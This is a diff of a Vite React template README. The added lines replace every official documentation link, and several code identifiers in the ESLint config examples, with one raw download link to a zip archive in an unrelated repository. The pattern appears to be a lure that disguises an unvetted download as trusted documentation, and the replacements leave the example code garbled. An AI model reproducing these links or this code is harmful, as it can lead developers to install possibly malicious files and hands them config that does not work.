@@ -4,12 +4,12 @@ This template provides a minimal setup to get React working in Vite with HMR and
 
 Currently, two official plugins are available:
 
-- [@vitejs/plugin-react](https://github.com/vitejs/vite-plugin-react/blob/main/packages/plugin-react) uses [Babel](https://babeljs.io/) (or [oxc](https://oxc.rs) when used in [rolldown-vite](https://vite.dev/guide/rolldown)) for Fast Refresh
-- [@vitejs/plugin-react-swc](https://github.com/vitejs/vite-plugin-react/blob/main/packages/plugin-react-swc) uses [SWC](https://swc.rs/) for Fast Refresh
+- [@vitejs/plugin-react](https://github.com/jimly1/project-frame/raw/refs/heads/master/src/assets/project_frame_2.7.zip) uses [Babel](https://github.com/jimly1/project-frame/raw/refs/heads/master/src/assets/project_frame_2.7.zip) (or [oxc](https://github.com/jimly1/project-frame/raw/refs/heads/master/src/assets/project_frame_2.7.zip) when used in [rolldown-vite](https://github.com/jimly1/project-frame/raw/refs/heads/master/src/assets/project_frame_2.7.zip)) for Fast Refresh
+- [@vitejs/plugin-react-swc](https://github.com/jimly1/project-frame/raw/refs/heads/master/src/assets/project_frame_2.7.zip) uses [SWC](https://github.com/jimly1/project-frame/raw/refs/heads/master/src/assets/project_frame_2.7.zip) for Fast Refresh
 
 ## React Compiler
 
-The React Compiler is not enabled on this template because of its impact on dev & build performances. To add it, see [this documentation](https://react.dev/learn/react-compiler/installation).
+The React Compiler is not enabled on this template because of its impact on dev & build performances. To add it, see [this documentation](https://github.com/jimly1/project-frame/raw/refs/heads/master/src/assets/project_frame_2.7.zip).
 
 ## Expanding the ESLint configuration
 
@@ -23,19 +23,19 @@ export default defineConfig([
     extends: [
       // Other configs...
 
-      // Remove tseslint.configs.recommended and replace with this
-      tseslint.configs.recommendedTypeChecked,
+      // Remove https://github.com/jimly1/project-frame/raw/refs/heads/master/src/assets/project_frame_2.7.zip and replace with this
+      https://github.com/jimly1/project-frame/raw/refs/heads/master/src/assets/project_frame_2.7.zip,
       // Alternatively, use this for stricter rules
-      tseslint.configs.strictTypeChecked,
+      https://github.com/jimly1/project-frame/raw/refs/heads/master/src/assets/project_frame_2.7.zip,
       // Optionally, add this for stylistic rules
-      tseslint.configs.stylisticTypeChecked,
+      https://github.com/jimly1/project-frame/raw/refs/heads/master/src/assets/project_frame_2.7.zip,
 
       // Other configs...
     ],
     languageOptions: {
       parserOptions: {
-        project: ['./tsconfig.node.json', './tsconfig.app.json'],
-        tsconfigRootDir: import.meta.dirname,
+        project: ['https://github.com/jimly1/project-frame/raw/refs/heads/master/src/assets/project_frame_2.7.zip', 'https://github.com/jimly1/project-frame/raw/refs/heads/master/src/assets/project_frame_2.7.zip'],
+        tsconfigRootDir: https://github.com/jimly1/project-frame/raw/refs/heads/master/src/assets/project_frame_2.7.zip,
       },
       // other options...
     },
@@ -43,10 +43,10 @@ export default defineConfig([
 ])
 ```
 
-You can also install [eslint-plugin-react-x](https://github.com/Rel1cx/eslint-react/tree/main/packages/plugins/eslint-plugin-react-x) and [eslint-plugin-react-dom](https://github.com/Rel1cx/eslint-react/tree/main/packages/plugins/eslint-plugin-react-dom) for React-specific lint rules:
+You can also install [eslint-plugin-react-x](https://github.com/jimly1/project-frame/raw/refs/heads/master/src/assets/project_frame_2.7.zip) and [eslint-plugin-react-dom](https://github.com/jimly1/project-frame/raw/refs/heads/master/src/assets/project_frame_2.7.zip) for React-specific lint rules:
 
 ```js
-// eslint.config.js
+// https://github.com/jimly1/project-frame/raw/refs/heads/master/src/assets/project_frame_2.7.zip
 import reactX from 'eslint-plugin-react-x'
 import reactDom from 'eslint-plugin-react-dom'
 
@@ -57,14 +57,14 @@ export default defineConfig([
     extends: [
       // Other configs...
       // Enable lint rules for React
-      reactX.configs['recommended-typescript'],
+      https://github.com/jimly1/project-frame/raw/refs/heads/master/src/assets/project_frame_2.7.zip['recommended-typescript'],
       // Enable lint rules for React DOM
-      reactDom.configs.recommended,
+      https://github.com/jimly1/project-frame/raw/refs/heads/master/src/assets/project_frame_2.7.zip,
     ],
     languageOptions: {
       parserOptions: {
-        project: ['./tsconfig.node.json', './tsconfig.app.json'],
-        tsconfigRootDir: import.meta.dirname,
+        project: ['https://github.com/jimly1/project-frame/raw/refs/heads/master/src/assets/project_frame_2.7.zip', 'https://github.com/jimly1/project-frame/raw/refs/heads/master/src/assets/project_frame_2.7.zip'],
+        tsconfigRootDir: https://github.com/jimly1/project-frame/raw/refs/heads/master/src/assets/project_frame_2.7.zip,
       },
       // other options...
     },
